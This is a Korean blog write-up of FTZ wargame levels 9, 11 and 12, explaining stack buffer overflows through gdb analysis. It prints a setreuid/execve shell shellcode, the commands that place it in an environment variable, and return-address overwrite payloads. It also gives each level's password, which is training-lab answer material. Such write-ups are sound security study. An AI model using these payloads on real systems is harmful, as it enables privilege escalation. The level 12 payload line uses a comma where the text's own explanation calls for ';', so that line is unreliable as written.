---
title: FTZ(Level 9, 11, 12)
author: 100zja
date: 2020-08-17
categories: [study]
tags: [ftz]
toc: ture
---

## **Level9**  

(1) gdb로 풀기  

![1](/images/구1.PNG) 

ls -al로 파일들을 확인하고  
힌트가 있음을 확인하고 힌트를 읽는다 

![2](/images/구2.PNG)  
코드를 해석해보면  
* char형 변수 buf, buf2가 10 크기의 배열로 각각 선언되고  

* 40만큼의 문자열을 fgets가 입력받아 buf에 저장한다  

* buf2에 저장된 문자가 go와 일치한다면 "Good skill!" 문구 출력과 3010의 level10 권한을 설정하고

* /bin/bash 쉘을 실행한다  
===> fgets에서 취약점이 발생해 버퍼 오버 플로우를 일으킨다는 것을 알 수 있다 

![3](/images/구3.PNG)  

gdb를 실행할 수 있는 권한이 있는 tmp로 이동한 뒤에 cat 명령어로 실행 파일을 생성한 뒤 컴파일한다

![4](/images/구4.PNG)  

gdb를 실행해서 메모리를 확인한다  
* main+3에서 40바이트의 메모리가 할당된다  
* main+43에서 eax에 ebp-40의 주소를 저장함 (buf)    
* main+65에서 eax에 ebp-24의 주소를 저장함(buf2)  
===> buf에서 입력 시에 ebp-40을 넘겨 16바이트를 넘기면 ebp-24 공간을 넘어가 버퍼 오버플로우 발생가능  

![5](/images/구5.PNG) 

bof 소스가 있는 /usr/bin 디렉토리로 이동해 bof 소스를 실행시켜 버퍼 오버플로우를 발생 시키고 level10의 권한을 얻어 my-pass로 확인한다  

### **level10 password : "interesting to hack!"**
-------------


## **Level11**  

![1](/images/십1.PNG)  
ls -al로 파일을 확인하고 cat hint 명령어를 통해 힌트를 열어본다  

![2](/images/십2.PNG)  
* int 배열과 char 배열을 받아옴
* 문자형 str배열의 크기는 256 바이트  
* 3092는 level12의 id임  
* 사용자가 입력한 값을 str에 넣고
* str 출력  
    - 사용자로부터 배열을 입력받은 뒤 프로그램의 인자로 입력받음  
====> strcpy에서 취약점이 발생해 버퍼 오버 플로우가 일어난다  
    
![3](/images/십4.PNG)  


test를 입력하니 그대로 출력된 것으로 보아 힌트가 attackme의 소스코드인 것을 알 수 있다.  

![4](/images/십5.PNG)  
attackme를 권한이 있는 tmp로 복사한 뒤 tmp로 이동해 gdb로 실행시킨다  
gdb를 해석해 보면  
* setreuid전에 확보된 메모리 : 108 + 8 (16진수) = 110 => 272 byte  
* main + 9 : SFP, RET =>8 byte  
===> 256(buffer) + 8(dummy) + 4(SFP) + 4(RET)  

![5](/images/십7.PNG)  
* export 명령어를 통해서 환경변수를 등록해준다  
    - export [환경변수명]=$(python -c 'print "쉘코드"')
* 쉘코드 : "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"  
![6](/images/십8.PNG)  
* env 명령어를 사용해 환경 변수를 확인한다  
    - env 명령어 : 현재 지정되어 있는 환경 변수들을 출력하거나, 새로운 환경 변수를 설정하고 적용된 내용을 출력하는 명령어  
    - env [옵션]... [name = 값]... [명령[인수]...]  


![7](/images/십9.PNG)  
![8](/images/십10.PNG) 

* getenv() 함수 : 환경변수를 읽는 역할  

* SHELLCODE를 실행시키는 프로그램을 짠 뒤 컴파일 해 준다  
dap을 실행해 보면 쉘코드 주소가 나타난다  

![9](/images/십11.PNG)  

* 마지막으로 RET 주소까지 가기 위해서는 268 byte가 필요하므로 페이로드(전송되는 데이터)를 작성해야한다 

* 0xbffffc1d를 리틀엔디안으로 변환하면 \x1d\xfc\xff\xbf  

* 페이로드를 완성하면 ./attackme `python -c 'print "A"*268+"\x1d\xfc\xff\xbf"'`  
===> 프로그램 실행 시 인자를 넘겨줌  
그 뒤에 id를 확인하고 level12가 된 것을 확인하고 my-pass를 통해 비밀번호를 확인한다  

### **level12 password : "it is like this"**  
----------------


## **Level 12**

![1](/images/하나.PNG)  
ls -al 명령어로 존재하는 파일들을 확인한다  
힌트가 있는 것을 확인한다

![2](/images/둘.PNG)  
cat hint 명령어를 사용해 힌트를 확인한다  
힌트를 분석해보면  
* 문자형 배열이 256 크기로 선언된다
* level 13의 id가 있고
* gets 함수로 str변수에 입력을 받고
* 입력받은 내용을 printf로 출력한다    
    - 프로그램을 실행한 뒤에 gets 함수로 입력을 받음   
===> gets 함수로 버퍼 오버플로우 취약점이 발생하게 된다

![3](/images/넷.PNG)  
attackme를 gdb로 보기 위해 권한이 있는 tmp 디렉토리로 복사한뒤 tmp로 이동해 gdb로 확인한다  
gdb를 확인해보면   
* main +3 : 264만큼의 메모리 확보  
    - str은 256 byte이므로 dummy값이 8 byte라는 것을 알 수 있음
    - RET - 4 byte
    - SFP - 4 byte
    - str - 256 byte   
===> return address를 덮어쓰기 위해서는 264(str) + 4(sfp) = 268 byte가 필요함  
* main + 49 : ebp - 264 -> str 버퍼부터 ebp까지 거리가 264임  
    - ret : ebp로부터 4byte 아래에 위치하기 때문에 268 byte가 된다(str 부터 ret 까지의 거리)  

문제를 해결하기 위해서는 level11 처럼 쉘코드를 이용해 환경변수에 등록해야한다  
* 쉘 코드 : "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"  

* 환경변수 : export 명령어 샤용  
    - export [환경변수명]=$(python -c 'print "쉘코드"')  
===> - export SHELLCODE=$(python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"') 를 환경변수로 등록한다  

![4](/images/다섯.PNG)  

그 다음 env 명령어로 등록된 환경변수를 확인한다  

![5](/images/여섯.PNG)  

환경변수에 등록된 쉘코드의 주소를 알아내기 위한 c언어 코드를 작성한 뒤 실행한다  

![6](/images/일곱.PNG)

코드를 컴파일 해준다  

![7](/images/여덟.PNG)  

컴파일 하고 실행해주면 쉘 코드의 주소가 나온다  

마지막으로 쉘 코드 주소를 리틀엔디안으로 변환하고 페이로드를 작성해 답을 구한다

쉘 코드 주소 : 0xbffffc1d  
리틀엔디안 변환 : \x1d\xfc\xff\xbf 

* 페이로드 : $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat) | ./attackme  
를 입력하면 권한이 얻어지고 my-pass로 level13의 패스워드를 확인한다  

    - level12에서 '|'(pipe)를 사용하는 이유는 gets가 프로그램 시작 중에 입력을 받기 때문이고 level11에서는 프로그램이 실행되는 동시에 인자를 받았기 때문에 '|'(pipe)를 사용하지 않았다   
    - '|'(pipe)를 사용하면 pipe 이전의 결과 값이 pipe 이후의 입력값이 됨  
    ===>  $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat)이 결과가 ./attackme의 데이터로 들어가게 됨  
    - cat을 쓰는 이유는 cat을 쓰지않으면 ./attackme가 표준입력을 받지 못하기 때문  
    ===> 동시에 같이 써줘야 함  
    - ';'을 이용하면 동시에 여러 명령어를 사용할 수 있음  
    -   따라서 $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat) | ./attackme 이런 형식의 페이로드가 나오게 된다  
